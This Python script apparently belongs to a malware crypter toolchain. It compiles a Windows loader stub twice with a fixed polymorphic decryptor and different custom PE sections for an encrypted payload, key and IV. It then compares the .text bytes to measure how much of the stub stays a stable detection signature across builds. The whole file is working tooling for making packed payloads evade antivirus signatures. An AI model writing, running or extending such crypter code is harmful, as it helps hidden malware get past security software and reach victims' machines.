#!/usr/bin/env python3
"""test_stub_same_dec.py — quantifies the STABLE chunk of .text.

Builds the stub twice with the SAME polymorphic decryptor but DIFFERENT
section-name/data injection (as real builds do), then compares .text bytes.
Shows how much of the code is a stable per-build signature.
"""
import os, re, struct, subprocess, sys

ROOT = os.path.dirname(os.path.abspath(__file__))
STUB_SRC = os.path.join(ROOT, "loader_stub_v5.cpp")
RES      = os.path.join(ROOT, "resource.res")

sys.path.insert(0, ROOT)
from polymorphic_decryptor import generate as gen_decryptor

decryptor_code = gen_decryptor()          # ONE decryptor, reused for both builds
print(f"[+] Fixed decryptor ({len(decryptor_code):,} chars)")

def build(tag, payload_secs, key_sec, iv_sec, bpv):
    src = open(STUB_SRC).read()
    poly_ph = "// @POLYMORPHIC_DECRYPTOR@"
    sec_ph  = "// @SECTION_NAMES@"
    assert src.count(poly_ph) == 1 and src.count(sec_ph) == 1
    src = src.replace(poly_ph, decryptor_code, 1)
    sn_c  = ", ".join(f'"{n}"' for n in payload_secs)
    sll_c = ", ".join(str(len(n)) for n in payload_secs)
    bp_c  = ", ".join(str(b) for b in bpv)
    btv_c = ", ".join(["256"] * len(payload_secs))
    section_code = (
        f'    BYTE* kd; DWORD ks; BYTE* ivd; DWORD ivs;\n'
        f'    if (!fs("{key_sec}", {len(key_sec)}, &kd, &ks) || ks < 32) return 2;\n'
        f'    if (!fs("{iv_sec}", {len(iv_sec)}, &ivd, &ivs) || ivs < 16) return 3;\n'
        f'    BYTE key[32], iv[16];\n'
        f'    xmc(key, kd, 32); xmc(iv, ivd, 16);\n'
        f'    const char* sn[] = {{{sn_c}}};\n'
        f'    const int sll[] = {{{sll_c}}};\n'
        f'    const DWORD bpv[] = {{{bp_c}}};\n'
        f'    const DWORD btv[] = {{{btv_c}}};\n'
    )
    src = src.replace(sec_ph, section_code, 1)
    tmp = os.path.join(ROOT, f"stub_{tag}.cpp")
    exe = os.path.join(ROOT, f"stub_{tag}.exe")
    open(tmp, "w").write(src)
    cmd = ["x86_64-w64-mingw32-g++", "-std=c++11", "-O2", "-fno-builtin", "-s",
           tmp, "-o", exe, "-nostartfiles", "-e", "WinMain", "-Wl,--strip-all",
           RES if os.path.exists(RES) else os.devnull]
    r = subprocess.run(cmd, capture_output=True, timeout=600)
    if r.returncode != 0:
        print(f"BUILD {tag} FAILED:\n" + r.stderr.decode()[-1500:])
        sys.exit(1)
    print(f"[+] built {tag}")
    return exe

def text_section(path):
    d = open(path, 'rb').read()
    e = struct.unpack_from('<I', d, 0x3C)[0]
    nsec = struct.unpack_from('<H', d, e + 6)[0]
    sz_opt = struct.unpack_from('<H', d, e + 20)[0]
    sec = e + 24 + sz_opt
    for i in range(nsec):
        base = sec + i * 40
        name = d[base:base + 8].rstrip(b'\x00')
        if name == b'.text':
            vsz = struct.unpack_from('<I', d, base + 8)[0]
            rsz = struct.unpack_from('<I', d, base + 16)[0]
            ptr = struct.unpack_from('<I', d, base + 20)[0]
            return d[ptr:ptr + min(vsz, rsz)]
    return b''

exe1 = build("A", [".wksp1", ".wksp2", ".wksp3", ".wksp4"], ".mkeyx", ".mivxx", [128, 128, 132, 140])
exe2 = build("B", [".rsmain", ".rsdata", ".rsaux", ".rscode"], ".gkey", ".aivx", [140, 148, 128, 132])

a = text_section(exe1)
b = text_section(exe2)
n = min(len(a), len(b))
ident = sum(1 for i in range(n) if a[i] == b[i])
best = run = 0
for i in range(n):
    if a[i] == b[i]:
        run += 1
        best = max(best, run)
    else:
        run = 0

print(f"\n=== SAME decryptor, different section data ===")
print(f".text A = {len(a):,}  B = {len(b):,}")
print(f"IDENTICAL: {ident:,} / {n:,}  ({100.0 * ident / n:.1f}%)  <- this is the STABLE signature")
print(f"Longest identical run: {best:,} bytes")
